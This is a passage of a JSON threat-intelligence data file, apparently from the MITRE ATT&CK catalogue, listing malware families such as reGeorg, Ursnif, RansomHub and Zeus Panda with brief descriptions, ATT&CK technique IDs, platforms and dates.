      "description": "[Misdat](https://attack.mitre.org/software/S0083) is a backdoor that was used in [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016) from 2010 to 2011.(Citation: Cylance Dust Storm)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1036.005",
        "T1083",
        "T1041",
        "T1095",
        "T1005",
        "T1070.004",
        "T1070.009",
        "T1082",
        "T1547",
        "T1132.001",
        "T1105",
        "T1059.003",
        "T1614.001",
        "T1027.002",
        "T1070.006",
        "T1106"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0083",
      "stix_id": "malware--0db09158-6e48-4e7c-8ce7-2b10b9c0c039",
      "created": "2017-05-31T21:32:55.126000+00:00",
      "modified": "2025-04-16T20:37:55.806000+00:00"
    },
    "S1187": {
      "id": "S1187",
      "name": "reGeorg",
      "description": "[reGeorg](https://attack.mitre.org/software/S1187) is an open-source web shell written in Python that can be used as a proxy to bypass firewall rules and tunnel data in and out of targeted networks.(Citation: Fortinet reGeorg MAR 2019)(Citation: GitHub reGeorg 2016)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.006",
        "T1572",
        "T1021.001",
        "T1105",
        "T1021.004",
        "T1071.001",
        "T1090",
        "T1021.002",
        "T1505.003",
        "T1095"
      ],
      "platforms": [
        "Network Devices",
        "Windows",
        "macOS",
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S1187",
      "stix_id": "malware--0e17b066-50dd-4c2f-83bf-205c5eb2bb34",
      "created": "2025-01-06T18:21:30.985000+00:00",
      "modified": "2025-04-15T19:46:33.459000+00:00"
    },
    "S0173": {
      "id": "S0173",
      "name": "FLIPSIDE",
      "description": "[FLIPSIDE](https://attack.mitre.org/software/S0173) is a simple tool similar to Plink that is used by [FIN5](https://attack.mitre.org/groups/G0053) to maintain access to victims. (Citation: Mandiant FIN5 GrrCON Oct 2016)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1572"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0173",
      "stix_id": "malware--0e18b800-906c-4e44-a143-b11c72b3448b",
      "created": "2018-01-16T16:13:52.465000+00:00",
      "modified": "2025-04-25T14:42:42.171000+00:00"
    },
    "S0362": {
      "id": "S0362",
      "name": "Linux Rabbit",
      "description": "[Linux Rabbit](https://attack.mitre.org/software/S0362) is malware that targeted Linux servers and IoT devices in a campaign lasting from August to October 2018. It shares code with another strain of malware known as Rabbot. The goal of the campaign was to install cryptocurrency miners onto the targeted servers and devices.(Citation: Anomali Linux Rabbit 2018)\n",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1110.003",
        "T1133",
        "T1546.004",
        "T1033",
        "T1132",
        "T1078"
      ],
      "platforms": [
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S0362",
      "stix_id": "malware--0efefea5-78da-4022-92bc-d726139e8883",
      "created": "2019-03-04T17:12:37.586000+00:00",
      "modified": "2025-04-25T14:42:42.534000+00:00"
    },
    "S0202": {
      "id": "S0202",
      "name": "adbupd",
      "description": "[adbupd](https://attack.mitre.org/software/S0202) is a backdoor used by [PLATINUM](https://attack.mitre.org/groups/G0068) that is similar to [Dipsind](https://attack.mitre.org/software/S0200). (Citation: Microsoft PLATINUM April 2016)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1546.003",
        "T1059.003",
        "T1573.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0202",
      "stix_id": "malware--0f1ad2ef-41d4-4b7a-9304-ddae68ea3005",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-25T14:42:42.902000+00:00"
    },
    "S0082": {
      "id": "S0082",
      "name": "Emissary",
      "description": "[Emissary](https://attack.mitre.org/software/S0082) is a Trojan that has been used by [Lotus Blossom](https://attack.mitre.org/groups/G0030). It shares code with [Elise](https://attack.mitre.org/software/S0081), with both Trojans being part of a malware group referred to as LStudio.(Citation: Lotus Blossom Dec 2015)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1547.001",
        "T1027.013",
        "T1055.001",
        "T1218.011",
        "T1016",
        "T1059.003",
        "T1082",
        "T1573.001",
        "T1071.001",
        "T1105",
        "T1615",
        "T1069.001",
        "T1007",
        "T1027.001",
        "T1543.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0082",
      "stix_id": "malware--0f862b01-99da-47cc-9bdb-db4a86a95bb1",
      "created": "2017-05-31T21:32:54.772000+00:00",
      "modified": "2025-04-02T20:35:25.274000+00:00"
    },
    "S0401": {
      "id": "S0401",
      "name": "Exaramel for Linux",
      "description": "[Exaramel for Linux](https://attack.mitre.org/software/S0401) is a backdoor written in the Go Programming Language and compiled as a 64-bit ELF binary. The Windows version is tracked separately under [Exaramel for Windows](https://attack.mitre.org/software/S0343).(Citation: ESET TeleBots Oct 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1105",
        "T1033",
        "T1071.001",
        "T1543",
        "T1140",
        "T1008",
        "T1543.002",
        "T1070.004",
        "T1548.001",
        "T1027.013",
        "T1059.004",
        "T1053.003"
      ],
      "platforms": [
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S0401",
      "stix_id": "malware--11194d8b-fdce-45d2-8047-df15bb8f16bd",
      "created": "2019-08-26T13:02:46.378000+00:00",
      "modified": "2024-04-11T02:34:14.304000+00:00"
    },
    "S0271": {
      "id": "S0271",
      "name": "KEYMARBLE",
      "description": "[KEYMARBLE](https://attack.mitre.org/software/S0271) is a Trojan that has reportedly been used by the North Korean government. (Citation: US-CERT KEYMARBLE Aug 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1016",
        "T1057",
        "T1059.003",
        "T1083",
        "T1105",
        "T1082",
        "T1113",
        "T1112",
        "T1573.001",
        "T1070.004"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0271",
      "stix_id": "malware--11e36d5b-6a92-4bf9-8eb7-85eb24f59e22",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:42:43.623000+00:00"
    },
    "S0043": {
      "id": "S0043",
      "name": "BUBBLEWRAP",
      "description": "[BUBBLEWRAP](https://attack.mitre.org/software/S0043) is a full-featured, second-stage backdoor used by the [admin@338](https://attack.mitre.org/groups/G0018) group. It is set to run when the system boots and includes functionality to check, upload, and register plug-ins that can further enhance its capabilities. (Citation: FireEye admin@338)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.001",
        "T1095",
        "T1082"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0043",
      "stix_id": "malware--123bd7b3-675c-4b1a-8482-c55782b20e2b",
      "created": "2017-05-31T21:32:33.738000+00:00",
      "modified": "2025-04-25T14:42:44.013000+00:00"
    },
    "S0391": {
      "id": "S0391",
      "name": "HAWKBALL",
      "description": "[HAWKBALL](https://attack.mitre.org/software/S0391) is a backdoor that was observed in targeting of the government sector in Central Asia.(Citation: FireEye HAWKBALL Jun 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1559.002",
        "T1027.013",
        "T1082",
        "T1071.001",
        "T1033",
        "T1041",
        "T1560.003",
        "T1203",
        "T1059.003",
        "T1070.004",
        "T1106"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0391",
      "stix_id": "malware--12a7450d-b03e-4990-a5b8-b405ab9c803b",
      "created": "2019-06-20T14:52:45.057000+00:00",
      "modified": "2024-04-11T02:23:13.352000+00:00"
    },
    "S1193": {
      "id": "S1193",
      "name": "TAMECAT",
      "description": "[TAMECAT](https://attack.mitre.org/software/S1193) is a malware that is used by [APT42](https://attack.mitre.org/groups/G1044) to execute PowerShell or C# content.(Citation: Mandiant APT42-untangling) ",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.003",
        "T1105",
        "T1059.005",
        "T1132.001",
        "T1047",
        "T1573.001",
        "T1518.001",
        "T1059.001",
        "T1071.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1193",
      "stix_id": "malware--12fdf05a-4bd1-4f45-9cde-d3af35f82db1",
      "created": "2025-01-08T22:21:32.556000+00:00",
      "modified": "2025-01-08T22:21:48.530000+00:00"
    },
    "S0613": {
      "id": "S0613",
      "name": "PS1",
      "description": "[PS1](https://attack.mitre.org/software/S0613) is a loader that was used to deploy 64-bit backdoors in the [CostaRicto](https://attack.mitre.org/groups/G0132) campaign.(Citation: BlackBerry CostaRicto November 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1105",
        "T1055.001",
        "T1059.001",
        "T1027.013",
        "T1140"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0613",
      "stix_id": "malware--13183cdf-280b-46be-913a-5c6df47831e7",
      "created": "2021-05-24T14:55:59.316000+00:00",
      "modified": "2024-04-11T00:25:13.397000+00:00"
    },
    "S0386": {
      "id": "S0386",
      "name": "Ursnif",
      "description": "[Ursnif](https://attack.mitre.org/software/S0386) is a banking trojan and variant of the Gozi malware observed being spread through various automated exploit kits, [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)s, and malicious links.(Citation: NJCCIC Ursnif Sept 2016)(Citation: ProofPoint Ursnif Aug 2016) [Ursnif](https://attack.mitre.org/software/S0386) is associated primarily with data theft, but variants also include components (backdoors, spyware, file injectors, etc.) capable of a wide variety of behaviors.(Citation: TrendMicro Ursnif Mar 2015)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1007",
        "T1547.001",
        "T1105",
        "T1027.013",
        "T1090.003",
        "T1074.001",
        "T1106",
        "T1497.003",
        "T1559.001",
        "T1056.004",
        "T1057",
        "T1041",
        "T1132",
        "T1055.005",
        "T1140",
        "T1036.005",
        "T1005",
        "T1027.010",
        "T1113",
        "T1543.003",
        "T1059.001",
        "T1071.001",
        "T1070.004",
        "T1012",
        "T1112",
        "T1568.002",
        "T1059.005",
        "T1082",
        "T1090",
        "T1047",
        "T1055.012",
        "T1185",
        "T1080",
        "T1091",
        "T1564.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0386",
      "stix_id": "malware--1492d0f8-7e14-4af3-9239-bc3fe10d3407",
      "created": "2019-06-04T18:42:22.552000+00:00",
      "modified": "2024-09-12T19:50:37.023000+00:00"
    },
    "S0665": {
      "id": "S0665",
      "name": "ThreatNeedle",
      "description": "[ThreatNeedle](https://attack.mitre.org/software/S0665) is a backdoor that has been used by [Lazarus Group](https://attack.mitre.org/groups/G0032) since at least 2019 to target cryptocurrency, defense, and mobile gaming organizations.  It is considered to be an advanced cluster of [Lazarus Group](https://attack.mitre.org/groups/G0032)'s Manuscrypt (a.k.a. NukeSped) malware family.(Citation: Kaspersky ThreatNeedle Feb 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1547.001",
        "T1204.002",
        "T1543.003",
        "T1105",
        "T1082",
        "T1083",
        "T1027.015",
        "T1005",
        "T1027.013",
        "T1027.011",
        "T1112",
        "T1140",
        "T1566.001",
        "T1036.005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0665",
      "stix_id": "malware--16040b1c-ed28-4850-9d8f-bb8b81c42092",
      "created": "2021-11-30T15:46:36.159000+00:00",
      "modified": "2024-04-10T22:32:30.915000+00:00"
    },
    "S1212": {
      "id": "S1212",
      "name": "RansomHub",
      "description": "[RansomHub](https://attack.mitre.org/software/S1212) is a ransomware-as-a-service (RaaS) offering with Windows, ESXi, Linux, and FreeBSD versions that has been in use since at least 2024 to target organizations in multiple sectors globally. [RansomHub](https://attack.mitre.org/software/S1212) operators may have purchased and rebranded resources from Knight  (formerly Cyclops) Ransomware which shares infrastructure, feature, and code overlaps with [RansomHub](https://attack.mitre.org/software/S1212).(Citation: CISA RansomHub AUG 2024)(Citation: Group-IB RansomHub FEB 2025)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.001",
        "T1070.004",
        "T1562.009",
        "T1090",
        "T1480",
        "T1070.001",
        "T1027.013",
        "T1547.001",
        "T1059.003",
        "T1140",
        "T1018",
        "T1021.002",
        "T1497.003",
        "T1490",
        "T1083",
        "T1486",
        "T1057",
        "T1491.001",
        "T1135",
        "T1489",
        "T1082"
      ],
      "platforms": [
        "Linux",
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1212",
      "stix_id": "malware--16662bee-9d15-4564-a128-1fce214866e9",
      "created": "2025-03-17T19:03:28.707000+00:00",
      "modified": "2025-03-27T14:29:41.961000+00:00"
    },
    "S0086": {
      "id": "S0086",
      "name": "ZLib",
      "description": "[ZLib](https://attack.mitre.org/software/S0086) is a full-featured backdoor that was used as a second-stage implant during [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016) since at least 2014. [ZLib](https://attack.mitre.org/software/S0086) is malware and should not be confused with the legitimate compression library from which its name is derived.(Citation: Cylance Dust Storm)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1105",
        "T1082",
        "T1560.002",
        "T1543.003",
        "T1083",
        "T1113",
        "T1059.003",
        "T1007",
        "T1041",
        "T1071.001",
        "T1036.005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0086",
      "stix_id": "malware--166c0eca-02fd-424a-92c0-6b5106994d31",
      "created": "2017-05-31T21:32:56.394000+00:00",
      "modified": "2025-04-16T20:37:56.750000+00:00"
    },
    "S0153": {
      "id": "S0153",
      "name": "RedLeaves",
      "description": "[RedLeaves](https://attack.mitre.org/software/S0153) is a malware family used by [menuPass](https://attack.mitre.org/groups/G0045). The code overlaps with [PlugX](https://attack.mitre.org/software/S0013) and may be based upon the open source tool Trochilus. (Citation: PWC Cloud Hopper Technical Annex April 2017) (Citation: FireEye APT10 April 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1547.009",
        "T1574.001",
        "T1555.003",
        "T1113",
        "T1027.013",
        "T1070.004",
        "T1059.003",
        "T1016",
        "T1082",
        "T1573.001",
        "T1033",
        "T1071.001",
        "T1083",
        "T1571",
        "T1547.001",
        "T1049",
        "T1105"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0153",
      "stix_id": "malware--17b40f60-729f-4fe8-8aea-cc9ee44a95d5",
      "created": "2017-12-14T16:46:06.044000+00:00",
      "modified": "2024-09-12T19:32:28.614000+00:00"
    },
    "S0133": {
      "id": "S0133",
      "name": "Miner-C",
      "description": "[Miner-C](https://attack.mitre.org/software/S0133) is malware that mines victims for the Monero cryptocurrency. It has targeted FTP servers and Network Attached Storage (NAS) devices to spread. (Citation: Softpedia MinerC)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1080"
      ],
      "platforms": [],
      "url": "https://attack.mitre.org/software/S0133",
      "stix_id": "malware--17dec760-9c8f-4f1b-9b4b-0ac47a453234",
      "created": "2017-05-31T21:33:16.315000+00:00",
      "modified": "2024-09-12T15:19:00.433000+00:00"
    },
    "S0145": {
      "id": "S0145",
      "name": "POWERSOURCE",
      "description": "[POWERSOURCE](https://attack.mitre.org/software/S0145) is a PowerShell backdoor that is a heavily obfuscated and modified version of the publicly available tool DNS_TXT_Pwnage. It was observed in February 2017 in spearphishing campaigns against personnel involved with United States Securities and Exchange Commission (SEC) filings at various organizations. The malware was delivered when macros were enabled by the victim and a VBS script was dropped. (Citation: FireEye FIN7 March 2017) (Citation: Cisco DNSMessenger March 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.001",
        "T1012",
        "T1547.001",
        "T1564.004",
        "T1071.004",
        "T1105"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0145",
      "stix_id": "malware--17e919aa-4a49-445c-b103-dbb8df9e7351",
      "created": "2017-05-31T21:33:24.739000+00:00",
      "modified": "2025-04-16T20:37:56.902000+00:00"
    },
    "S1121": {
      "id": "S1121",
      "name": "LITTLELAMB.WOOLTEA",
      "description": "[LITTLELAMB.WOOLTEA](https://attack.mitre.org/software/S1121) is a backdoor that was used by UNC5325 during [Cutting Edge](https://attack.mitre.org/campaigns/C0029) to deploy malware on targeted Ivanti Connect Secure VPNs and to establish persistence across system upgrades and patches.(Citation: Mandiant Cutting Edge Part 3 February 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1095",
        "T1090",
        "T1573.002",
        "T1554",
        "T1543",
        "T1083",
        "T1082"
      ],
      "platforms": [
        "Network Devices"
      ],
      "url": "https://attack.mitre.org/software/S1121",
      "stix_id": "malware--19256855-65e9-48f2-8b74-9f3d0a994428",
      "created": "2024-03-13T18:41:57.589000+00:00",
      "modified": "2025-04-15T19:46:33.606000+00:00"
    },
    "S0171": {
      "id": "S0171",
      "name": "Felismus",
      "description": "[Felismus](https://attack.mitre.org/software/S0171) is a modular backdoor that has been used by [Sowbug](https://attack.mitre.org/groups/G0054). (Citation: Symantec Sowbug Nov 2017) (Citation: Forcepoint Felismus Mar 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1036.005",
        "T1033",
        "T1071.001",
        "T1518.001",
        "T1082",
        "T1132.001",
        "T1016",
        "T1105",
        "T1573.001",
        "T1059.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0171",
      "stix_id": "malware--196f1f32-e0c2-4d46-99cd-234d4b6befe1",
      "created": "2018-01-16T16:13:52.465000+00:00",
      "modified": "2025-04-25T14:42:46.344000+00:00"
    },
    "S0330": {
      "id": "S0330",
      "name": "Zeus Panda",
      "description": "[Zeus Panda](https://attack.mitre.org/software/S0330) is a Trojan designed to steal banking information and other sensitive credentials for exfiltration. [Zeus Panda](https://attack.mitre.org/software/S0330)\u2019s original source code was leaked in 2011, allowing threat actors to use its source code as a basis for new malware variants. It is mainly used to target Windows operating systems ranging from Windows XP through Windows 10.(Citation: Talos Zeus Panda Nov 2017)(Citation: GDATA Zeus Panda June 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1056.004",
        "T1059.001",
        "T1518.001",
        "T1057",
        "T1113",
        "T1105",
        "T1059",
        "T1124",
        "T1614.001",
        "T1112",
        "T1071.001",
        "T1070.004",
        "T1027.013",
        "T1027.010",
        "T1059.003",
        "T1115",
        "T1012",
        "T1055.002",
        "T1082",
        "T1547.001",
        "T1056.001",
        "T1140",
        "T1083"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0330",
      "stix_id": "malware--198db886-47af-4f4c-bff5-11b891f85946",
      "created": "2019-01-29T17:59:43.600000+00:00",
      "modified": "2024-04-10T20:31:00.234000+00:00"
    },
    "S0049": {
      "id": "S0049",
      "name": "GeminiDuke",
      "description": "[GeminiDuke](https://attack.mitre.org/software/S0049) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) from 2009 to 2012. (Citation: F-Secure The Dukes)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1083",
        "T1087.001",
        "T1057",
        "T1016",
        "T1007",
        "T1071.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0049",
      "stix_id": "malware--199463de-d9be-46d6-bb41-07234c1dd5a6",
      "created": "2017-05-31T21:32:36.177000+00:00",
      "modified": "2025-04-25T14:42:46.881000+00:00"
    },
    "S0462": {
      "id": "S0462",
      "name": "CARROTBAT",
      "description": "[CARROTBAT](https://attack.mitre.org/software/S0462) is a customized dropper that has been in use since at least 2017. [CARROTBAT](https://attack.mitre.org/software/S0462) has been used to install [SYSCON](https://attack.mitre.org/software/S0464) and has infrastructure overlap with [KONNI](https://attack.mitre.org/software/S0356).(Citation: Unit 42 CARROTBAT November 2018)(Citation: Unit 42 CARROTBAT January 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1082",
        "T1059.003",
        "T1027.010",
        "T1105",
        "T1070.004",
        "T1027.013"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0462",
      "stix_id": "malware--1b9f0800-035e-4ed1-9648-b18294cc5bc8",
      "created": "2020-06-02T14:11:40.581000+00:00",
      "modified": "2024-04-11T02:46:42.264000+00:00"
    },
    "S0167": {
      "id": "S0167",
      "name": "Matryoshka",
      "description": "[Matryoshka](https://attack.mitre.org/software/S0167) is a malware framework used by [CopyKittens](https://attack.mitre.org/groups/G0052) that consists of a dropper, loader, and RAT. It has multiple versions; v1 was seen in the wild from July 2016 until January 2017. v2 has fewer commands and other minor differences. (Citation: ClearSky Wilted Tulip July 2017) (Citation: CopyKittens Nov 2015)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1056.001",
        "T1059",
        "T1547.001",
        "T1055.001",
        "T1555",
        "T1027",
        "T1113",
        "T1071.004",
        "T1218.011",
        "T1053.005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0167",
      "stix_id": "malware--1cc934e4-b01d-4543-a011-b988dfc1a458",
      "created": "2018-01-16T16:13:52.465000+00:00",
      "modified": "2024-11-17T12:44:07.639000+00:00"
    },
    "S0503": {
      "id": "S0503",
      "name": "FrameworkPOS",
      "description": "[FrameworkPOS](https://attack.mitre.org/software/S0503) is a point of sale (POS) malware used by [FIN6](https://attack.mitre.org/groups/G0037) to steal payment card data from sytems that run physical POS devices.(Citation: SentinelOne FrameworkPOS September 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1005",
        "T1048",
        "T1074.001",
        "T1057",
        "T1560.003"
      ],
      "platforms": [],
      "url": "https://attack.mitre.org/software/S0503",
      "stix_id": "malware--1cdbbcab-903a-414d-8eb0-439a97343737",
      "created": "2020-09-08T14:55:46.094000+00:00",
      "modified": "2025-04-25T14:42:47.607000+00:00"
    },
    "S0237": {
      "id": "S0237",
      "name": "GravityRAT",
      "description": "[GravityRAT](https://attack.mitre.org/software/S0237) is a remote access tool (RAT) and has been in ongoing development since 2016. The actor behind the tool remains unknown, but two usernames have been recovered that link to the author, which are \"TheMartian\" and \"The Invincible.\" According to the National Computer Emergency Response Team (CERT) of India, the malware has been identified in attacks against organization and entities in India. (Citation: Talos GravityRAT)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1027.005",
        "T1082",
        "T1016",
        "T1049",
        "T1124",
        "T1027.013",
        "T1071.001",
        "T1057",
        "T1025",
        "T1497.001",
        "T1053.005",
        "T1083",
        "T1007",
        "T1005",
        "T1059.003",
        "T1033",
        "T1559.002",
        "T1571",
        "T1047"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0237",
      "stix_id": "malware--1d1fce2f-0db5-402b-9843-4278a0694637",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2024-04-11T02:25:20.119000+00:00"
    },
    "S0109": {
      "id": "S0109",
      "name": "WEBC2",
      "description": "[WEBC2](https://attack.mitre.org/software/S0109) is a family of backdoor malware used by [APT1](https://attack.mitre.org/groups/G0006) as early as July 2006. [WEBC2](https://attack.mitre.org/software/S0109) backdoors are designed to retrieve a webpage, with commands hidden in HTML comments or special tags, from a predetermined C2 server. (Citation: Mandiant APT1 Appendix)(Citation: Mandiant APT1)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1574.001",
        "T1105",
        "T1059.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0109",
      "stix_id": "malware--1d808f62-cf63-4063-9727-ff6132514c22",
      "created": "2017-05-31T21:33:06.433000+00:00",
      "modified": "2023-12-26T19:55:54.848000+00:00"
    },
    "S1058": {
      "id": "S1058",
      "name": "Prestige",
      "description": "[Prestige](https://attack.mitre.org/software/S1058) ransomware has been used by [Sandworm Team](https://attack.mitre.org/groups/G0034) since at least March 2022, including against transportation and related logistics industries in Ukraine and Poland in October 2022.(Citation: Microsoft Prestige ransomware October 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1484.001",
        "T1489",
        "T1486",
        "T1053.005",
        "T1490",
        "T1112",
        "T1106",
        "T1059.001",
        "T1083"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1058",
      "stix_id": "malware--1da748a5-875d-4212-9222-b4c23ab861be",
      "created": "2023-01-20T18:43:05.682000+00:00",
      "modified": "2025-04-16T20:37:57.513000+00:00"
    },
    "S0239": {
      "id": "S0239",
      "name": "Bankshot",
      "description": "[Bankshot](https://attack.mitre.org/software/S0239) is a remote access tool (RAT) that was first reported by the Department of Homeland Security in December of 2017. In 2018, [Lazarus Group](https://attack.mitre.org/groups/G0032) used the [Bankshot](https://attack.mitre.org/software/S0239) implant in attacks against the Turkish financial sector. (Citation: McAfee Bankshot)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.001",
        "T1005",
        "T1070.004",
        "T1083",
        "T1070.006",
        "T1203",
        "T1057",
        "T1140",
        "T1082",
        "T1543.003",
        "T1106",
        "T1012",
        "T1132.002",
        "T1119",
        "T1001.003",
        "T1105",
        "T1087.001",
        "T1087.002",
        "T1112",
        "T1134.002",
        "T1059.003",
        "T1041",
        "T1070",
        "T1571"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0239",
      "stix_id": "malware--1f6e3702-7ca1-4582-b2e7-4591297d05a8",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:42:48.512000+00:00"
    },
    "S1089": {
      "id": "S1089",
      "name": "SharpDisco",
      "description": "[SharpDisco](https://attack.mitre.org/software/S1089) is a dropper developed in C# that has been used by [MoustachedBouncer](https://attack.mitre.org/groups/G1019) since at least 2020 to load malicious plugins.(Citation: MoustachedBouncer ESET August 2023)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1053.005",
        "T1564.003",
        "T1005",
        "T1041",
        "T1071.002",
        "T1082",
        "T1059.003",
        "T1106",
        "T1120",
        "T1105",
        "T1083"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1089",
      "stix_id": "malware--1fefb062-feda-484a-8f10-0cebf65e20e3",
      "created": "2023-09-26T20:19:15.106000+00:00",
      "modified": "2025-04-16T20:37:57.878000+00:00"
    },
    "S0491": {
      "id": "S0491",
      "name": "StrongPity",
      "description": "[StrongPity](https://attack.mitre.org/software/S0491) is an information stealing malware used by [PROMETHIUM](https://attack.mitre.org/groups/G0056).(Citation: Bitdefender StrongPity June 2020)(Citation: Talos Promethium June 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1020",
        "T1564.003",
        "T1571",
        "T1016",
        "T1041",
        "T1560.003",
        "T1036.004",
        "T1027.013",
        "T1562.001",
        "T1204.002",
        "T1071.001",
        "T1070.004",
        "T1518.001",
        "T1083",
        "T1119",
        "T1059.001",
        "T1543.003",
        "T1573.002",
        "T1082",
        "T1090.003",
        "T1105",
        "T1547.001",
        "T1057",
        "T1569.002",
        "T1553.002",
        "T1036.005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0491",
      "stix_id": "malware--20945359-3b39-4542-85ef-08ecb4e1c174",
      "created": "2020-07-20T17:41:19.690000+00:00",
      "modified": "2024-04-10T23:47:16.416000+00:00"
    },
    "S0214": {
      "id": "S0214",
      "name": "HAPPYWORK",
      "description": "[HAPPYWORK](https://attack.mitre.org/software/S0214) is a downloader used by [APT37](https://attack.mitre.org/groups/G0067) to target South Korean government and financial victims in November 2016. (Citation: FireEye APT37 Feb 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1082",
        "T1033",
        "T1105"
      ],
      "platforms": [],
      "url": "https://attack.mitre.org/software/S0214",
      "stix_id": "malware--211cfe9f-2676-4e1c-a5f5-2c8091da2a68",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2024-11-17T15:01:33.385000+00:00"
    },
    "S0653": {
      "id": "S0653",
      "name": "xCaon",
      "description": "[xCaon](https://attack.mitre.org/software/S0653) is an HTTP variant of the [BoxCaon](https://attack.mitre.org/software/S0651) malware family that has used by [IndigoZebra](https://attack.mitre.org/groups/G0136) since at least 2014. [xCaon](https://attack.mitre.org/software/S0653) has been used to target political entities in Central Asia, including Kyrgyzstan and Uzbekistan.(Citation: Checkpoint IndigoZebra July 2021)(Citation: Securelist APT Trends Q2 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1005",
        "T1071.001",
        "T1547",
        "T1016",
        "T1518.001",
        "T1573.001",
        "T1105",
        "T1132.001",
        "T1059.003",
        "T1106",
        "T1140"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0653",
      "stix_id": "malware--21583311-6321-4891-8a37-3eb4e57b0fb1",
      "created": "2021-09-29T00:04:26.906000+00:00",
      "modified": "2025-04-25T14:42:49.417000+00:00"
    },
    "S0254": {
      "id": "S0254",
      "name": "PLAINTEE",
      "description": "[PLAINTEE](https://attack.mitre.org/software/S0254) is a malware sample that has been used by [Rancor](https://attack.mitre.org/groups/G0075) in targeted attacks in Singapore and Cambodia. (Citation: Rancor Unit42 June 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1082",
        "T1112",
        "T1016",
        "T1548.002",
        "T1057",
        "T1547.001",
        "T1573.001",
        "T1059.003",
        "T1105"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0254",
      "stix_id": "malware--21c0b55b-5ff3-4654-a05e-e3fc1ee1ce1b",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:42:49.775000+00:00"
    },
    "S0453": {
      "id": "S0453",
      "name": "Pony",
